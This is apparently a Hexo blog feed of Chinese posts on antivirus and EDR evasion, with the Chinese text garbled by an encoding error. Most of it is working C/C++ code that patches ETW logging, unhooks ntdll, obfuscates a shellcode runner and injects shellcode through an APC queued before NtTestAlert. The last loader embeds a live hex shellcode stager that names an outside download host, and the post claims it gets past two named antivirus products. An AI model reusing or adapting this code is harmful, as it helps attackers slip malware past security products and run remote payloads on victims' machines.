class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. ä» ntdll.dll ä¸­å–å¾— EtwEventWrite çš„åœ°å€</span></span><br><span class="line">	HMODULE hNtdll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="comment">//LPVOID pEtwEventWrite = GetProcAddress(hNtdll, &quot;EtwEventWrite&quot;);</span></span><br><span class="line">	<span class="comment">//å¯èƒ½ä¼šæœ‰æŸäº›edrä¼šå¯¹EtwEventWriteå‡½æ•°hook,æ‰€ä»¥è¿™é‡Œå¯ä»¥å¤„ç†ä¸‹</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> pEtwEventWriteProcName[] = &#123; <span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	LPVOID pEtwEventWrite = GetProcAddress(hNtdll, (LPCSTR)pEtwEventWriteProcName);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. æŠŠ EtwEventWrite çš„åœ°å€çš„æƒé™æ”¹æˆå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ(rwx)</span></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 4. å°† EtwEventWrite çš„ç¬¬ä¸€ä¸ª byte æ”¹æˆ 0xc3ï¼Œä¹Ÿå°±æ˜¯retè¿”å›æŒ‡ä»¤</span></span><br><span class="line">	<span class="type">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line">	WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 5. æŠŠ EtwEventWrite çš„æƒé™æ”¹å›ï¼Œå¹¶ä¸”ç»§ç»­æ‰§è¡Œ Process</span></span><br><span class="line">	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>);</span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line"></span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw">https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw</a><br><a href="https://tttang.com/archive/1612/">https://tttang.com/archive/1612/</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>ntdllè„±é’©</title>
    <url>/posts/dabd444/</url>
    <content><![CDATA[<h4 id="é‡è½½-textèŠ‚å¯¹ntdllè„±é’©"><a href="#é‡è½½-textèŠ‚å¯¹ntdllè„±é’©" class="headerlink" title="é‡è½½.textèŠ‚å¯¹ntdllè„±é’©"></a>é‡è½½.textèŠ‚å¯¹ntdllè„±é’©</h4><p>æ€è½¯ä¼šå¯¹ntdllè¿›å…¥å†…æ ¸çš„å‡½æ•°è¿›è¡ŒæŒ‚é’©ï¼Œä»è€Œå®ç°æ£€æµ‹å’Œé˜»æ­¢ï¼Œä½†æ˜¯å¥½åƒå¾ˆå°‘æœ‰æ€è½¯ä¼šå»ntdllè¿›è¡ŒæŒ‚é’©ï¼Œè¿™é‡Œä¸»è¦å­¦ä¹ ä¸€ä¸‹è¿™ç§æ€è·¯ã€‚å°†ntdllè¯»å–åˆ°å†…å­˜ï¼Œç„¶åè¯»å–è¦†ç›–.textèŠ‚</p>
<p><img src="/posts/dabd444/1.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span>&#123;</span><br><span class="line">&#123;</span><br><span class="line">	MODULEINFO mInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//get address of ntdll in virtual memory </span></span><br><span class="line">	<span class="comment">//è·å–ntdllåœ¨å†…å­˜ä¸­çš„åœ°å€</span></span><br><span class="line">	HMODULE hNtdll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	GetModuleInformation(hProcess, hNtdll, &amp;mInfo, <span class="keyword">sizeof</span>(mInfo));</span><br><span class="line">	LPVOID lpNtdllbase = (LPVOID)mInfo.lpBaseOfDll;</span><br><span class="line">	</span><br><span class="line">	HANDLE hNtdllfile = CreateFileA(<span class="string">&quot;C:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HANDLE hNtdllMapping = CreateFileMapping(hNtdllfile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosheader = (PIMAGE_DOS_HEADER)lpNtdllbase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpNtdllbase + pDosheader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; pNtheader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionheader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtheader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line">	<span class="comment">//æ‰¾åˆ°.text</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">char</span>*)pSectionheader-&gt;Name, (<span class="type">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">			DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="type">bool</span> isProtected = VirtualProtect((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), pSectionheader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)lpNtdllmaping + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), pSectionheader-&gt;Misc.VirtualSize);</span><br><span class="line">			</span><br><span class="line">			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader-&gt;VirtualAddress), pSectionheader-&gt;Misc.VirtualSize, oldProtection, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(hNtdllfile);</span><br><span class="line">	CloseHandle(lpNtdllmaping);</span><br><span class="line">	<span class="comment">//FreeLibrary(hNtdll);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF( name )*(UINT_PTR *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_64( name )*(DWORD64 *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_32( name )*(DWORD *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_16( name )*(WORD *)(name)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEREF_8( name )*(BYTE *)(name)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemory)</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	ULONG_PTR ZeroBits,</span></span><br><span class="line"><span class="params">	PSIZE_T RegionSize,</span></span><br><span class="line"><span class="params">	ULONG AllocationType,</span></span><br><span class="line"><span class="params">	ULONG Protect)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°GetProcessAddress æºä»£ç åœ¨ä¸‹é¢é“¾æ¥</span></span><br><span class="line"><span class="comment">//https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/GetProcAddressR.c</span></span><br><span class="line">FARPROC WINAPI <span class="title function_">GetProcAddressR</span><span class="params">(HANDLE hModule, LPCSTR lpProcName)</span></span><br><span class="line">&#123;</span><br><span class="line">	UINT_PTR uiLibraryAddress = <span class="number">0</span>;</span><br><span class="line">	FARPROC fpResult = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	uiLibraryAddress = (UINT_PTR)hModule;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		UINT_PTR uiAddressArray = <span class="number">0</span>;</span><br><span class="line">		UINT_PTR uiNameArray = <span class="number">0</span>;</span><br><span class="line">		UINT_PTR uiNameOrdinals = <span class="number">0</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS pNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		</span><br><span class="line">		pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew);</span><br><span class="line">		pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory-&gt;VirtualAddress);</span><br><span class="line">		uiAddressArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">		uiNameArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">		uiNameOrdinals = (uiLibraryAddress + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (((DWORD)lpProcName &amp; <span class="number">0xFFFF0000</span>) == <span class="number">0x00000000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory-&gt;Base) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">			fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			DWORD dwCounter = pExportDirectory-&gt;NumberOfNames;</span><br><span class="line">			<span class="keyword">while</span> (dwCounter--)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(uiLibraryAddress + DEREF_32(uiNameArray));</span><br><span class="line">				<span class="comment">//</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(cpExportedFunctionName, lpProcName) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">					fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				uiNameArray += <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">				uiNameOrdinals += <span class="keyword">sizeof</span>(WORD);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">	&#123;</span><br><span class="line">		fpResult = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fpResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//åˆ›å»ºå…±äº«å†…å­˜æ˜ å°„ä¸€ä¸ªntdll</span></span><br><span class="line">	<span class="comment">//ä½¿ç”¨CreateFileA æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">	HANDLE hNtdllfile = CreateFileA(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//åˆ›å»ºå…±äº«å†…å­˜çš„å†…å­˜æ˜ å°„å¯¹è±¡</span></span><br><span class="line">	HANDLE hNtdllMapping = CreateFileMapping(hNtdllfile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//å¾—åˆ°è¯¥å†…å­˜ç©ºé—´çš„æ˜ å°„åœ°å€</span></span><br><span class="line">	LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddressR((HMODULE)lpNtdllmaping, <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> err = GetLastError();</span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &amp;Address, <span class="number">0</span>, &amp;uSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://idiotc4t.com/defense-evasion/reload-ntdll-.text-section">https://idiotc4t.com/defense-evasion/reload-ntdll-.text-section</a><br><a href="https://idiotc4t.com/defense-evasion/load-ntdll-too">https://idiotc4t.com/defense-evasion/load-ntdll-too</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»£ç æ··æ·†</title>
    <url>/posts/3497b4c5/</url>
    <content><![CDATA[<p><a href="https://idiotc4t.com/defense-evasion/compile-time-obfuscation">https://idiotc4t.com/defense-evasion/compile-time-obfuscation</a><br>è¯¥å·¥å…·å¯ä»¥åœ¨ç¼–è¯‘æ—¶æ··æ·†å‡½æ•°è°ƒç”¨ ä¹Ÿå¯ä»¥æ··æ·†å­—ç¬¦ä¸²ï¼Œå¯¹æ€æ¯’è½¯ä»¶åˆ¤æ–­çš„é™æ€ç‰¹å¾äº§ç”Ÿå¾ˆå¤§ç¨‹åº¦çš„é¿å…ï¼ŒåŒæ—¶æ··æ·†å‡½æ•°è°ƒç”¨ä¹Ÿèƒ½å¯¹è¡Œä¸ºæŸ¥æ€äº§ç”Ÿä¸€å®šç¨‹åº¦çš„å½±å“</p>
<p>å¯¼å…¥éœ€è¦çš„å¤´æ–‡ä»¶ éœ€è¦å®‰è£…boost åœ¨vsä¸­è¿›è¡Œé…ç½®ï¼Œæ·»åŠ é™„åŠ åŒ…å«ç›®å½•</p>
<p><img src="/posts/3497b4c5/1.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(DEBUG) || DEBUG == 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOOST_DISABLE_ASSERTS</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable: 4503)</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADVLOG 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Log.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ObfuscatedCall.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ObfuscatedCallWithPredicate.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)   </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCREMENTAL:NO&quot;</span>) </span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line">using namespace andrivet::ADVobfuscator;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>; <span class="comment">//è¿™é‡Œä¸èƒ½ä½¿ç”¨å¸¸è§„çš„shellcode å¸¸è§„çš„shellcodeå·²è¢«æ€è½¯è®°å½•åœ¨æ ·æœ¬åº“ä¸­ ä¼šæ ¹æ®æ­¤shellcodeæŸ¥æ€</span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">exec</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>))&amp;buf)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span>*[])</span></span><br><span class="line">&#123;</span><br><span class="line">	OBFUSCATED_CALL0(exec);</span><br><span class="line">	<span class="comment">//exec();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://idiotc4t.com/defense-evasion/compile-time-obfuscation">https://idiotc4t.com/defense-evasion/compile-time-obfuscation</a><br><a href="https://blog.csdn.net/u010921682/article/details/80179732">https://blog.csdn.net/u010921682/article/details/80179732</a></p>
]]></content>
  </entry>
  <entry>
    <title>APCæ³¨å…¥_NtTestAlert</title>
    <url>/posts/5788eae8/</url>
    <content><![CDATA[<p>EarlyBird æœ¬è´¨ä¸Šæ˜¯ä¸€ç§APCæ³¨å…¥ä¸çº¿ç¨‹åŠ«æŒçš„ç¼–åˆ¶ï¼Œåœ¨çº¿ç¨‹åˆå§‹åŒ–æ—¶ä¼šè°ƒç”¨ntdllä¸­çš„æœªå¯¼å‡ºå‡½æ•°<code>NtTestAlert</code>  <code>NtTestAlert</code>æ˜¯ä¸€ä¸ªæ£€æŸ¥å½“å‰çº¿ç¨‹çš„APCé˜Ÿåˆ—çš„å‡½æ•°ï¼Œå¦‚æœæœ‰ä»»ä½•æ’é˜Ÿçš„ä½œä¸šï¼Œä»–ä¼šæ¸…ç©ºé˜Ÿåˆ—ã€‚å½“çº¿ç¨‹å¯åŠ¨æ—¶<code>NtTestAlert</code>ä¼šåœ¨<em>æ‰§è¡Œä»»ä½•æ“ä½œä¹‹å‰</em>è¢«è°ƒç”¨ã€‚å› æ­¤åœ¨çº¿ç¨‹å¼€å§‹çŠ¶æ€ä¸‹å¯¹APCè¿›è¡Œæ“ï¼Œé‚£å°±å¯ä»¥å®Œç¾æ‰§è¡Œshellcodeã€‚è¯¥æ–¹æ³•è¢«ç”¨æ¥BypassAV/Edrhookçš„è¿‡ç¨‹ï¼Œå®ƒé©¶å…¥åœ¨AV/EDRæœ‰æœºä¼šå°†å…¶æŒ‚é’©æ”¾åœ¨æ–°åˆ›å»ºçš„è¿›ç¨‹ä¸­ä¹‹å‰è¿è¡Œshellcode.</p>
<p>æ­¥éª¤:</p>
<ul>
<li>1.åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çŠ¶æ€çš„è¿›ç¨‹<br>(å¦‚æœæ˜¯å°†shellcodeæ³¨å…¥åˆ°æœ¬åœ°è¿›ç¨‹ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨APCåˆ°å½“å‰è¿›ç¨‹åœ¨å»è°ƒç”¨NtTestAlert)<br>CreateProcessA( â€¦, CREATE_SUSPENDED, â€¦)` ä¾¿å¯åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çŠ¶æ€çš„è¿›ç¨‹.</li>
<li>2.ä¸ºshellcodeåˆ†é…å†…å­˜ç©ºé—´,å†™å…¥shellcode</li>
<li>3.æ’å…¥APCåˆ°ä¸»çº¿ç¨‹(å½“å‰çº¿ç¨‹)</li>
<li>4.è°ƒç”¨NtTestAlert()æ‰§è¡Œshellcode</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> myNtTestAlert = <span class="built_in">NTSTATUS</span>(NTAPI*)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[] = <span class="string">&quot;fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd5e80000000031ff5757575757683a5679a7ffd5e9a40000005b31c951516a03515168fb20000053506857899fc6ffd550e98c0000005b31d252680032c08452525253525068eb552e3bffd589c683c350688033000089e06a04506a1f566875469e86ffd55f31ff57576aff5356682d06187bffd585c00f84ca01000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f000039c775075850e97bffffff31ffe991010000e9c9010000e86fffffff2f5877424b00c638b6057378a894eecf7bc1aa53ba78900a3bb158655591a5330461ce3d74a0e14842e13a75861c930427a411f354079ef04a095ad081b8e47fe04ded2f08e0fc010136d933a1807300557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b20574f5736343b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f0d0a486f73743a2075732e776f726c646973656e646d61696c2e6d6c0d0a007fef054e2008ae77070f044f1087a24772a18e66fbc21da7ae0deb5058231549208008c5c1d40c32c9f88b3e85652e58a3ca12e34ad665175870d1fc6d165493374260b2c750510707a5328dbaf92eab4f0b92fa87e05815da018b2c9a4a322ff33122f6bb9634cb1790d825298529cb30e5f01f7e6cdfba37bd78b967e41a7ece26d438f78459445dbdd9e7b1c7e0adf81b0c58a4d3ecf83e57191cbeb494683b9b25b3dd9bb903b1421b77de08b283b4e28820e49b04b8b303f85c4d1495900068f0b5a256ffd56a4068001000006800004000576858a453e5ffd593b90000000001d9515389e7576800200000535668129689e2ffd585c074c68b0701c385c075e558c3e889fdffff75732e776f726c646973656e646d61696c2e6d6c00499602d2&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	myNtTestAlert testAlert = (myNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> char_in_hex;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> iterations = <span class="built_in">strlen</span>(buf);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> memory_allocation = <span class="built_in">strlen</span>(buf) / <span class="number">2</span>;</span><br><span class="line">	<span class="comment">//ç”±äºå­—ç¬¦ä¸²ç¼–è¯‘åé»˜è®¤å†™å…¥ä¸å¯å†™çš„PEæ®µï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹å†…å­˜å±æ€§</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; iterations / <span class="number">2</span>; i++) &#123; <span class="comment">//å‡å°å¼€é”€</span></span><br><span class="line">		<span class="built_in">sscanf_s</span>(buf + <span class="number">2</span> * i, <span class="string">&quot;%2X&quot;</span>, &amp;char_in_hex);</span><br><span class="line">		buf[i] = (<span class="type">char</span>)char_in_hex;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	LPVOID shellAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, memory_allocation, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), shellAddress, buf, memory_allocation, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//æ’å…¥APCåˆ°å½“å‰çº¿ç¨‹</span></span><br><span class="line">	<span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//APCé˜Ÿåˆ—ä¸ä¸ºç©ºé©¬ä¸Šè¿è¡Œ</span></span><br><span class="line">	<span class="built_in">testAlert</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯è¿‡ 360ã€ç«ç»’</p>
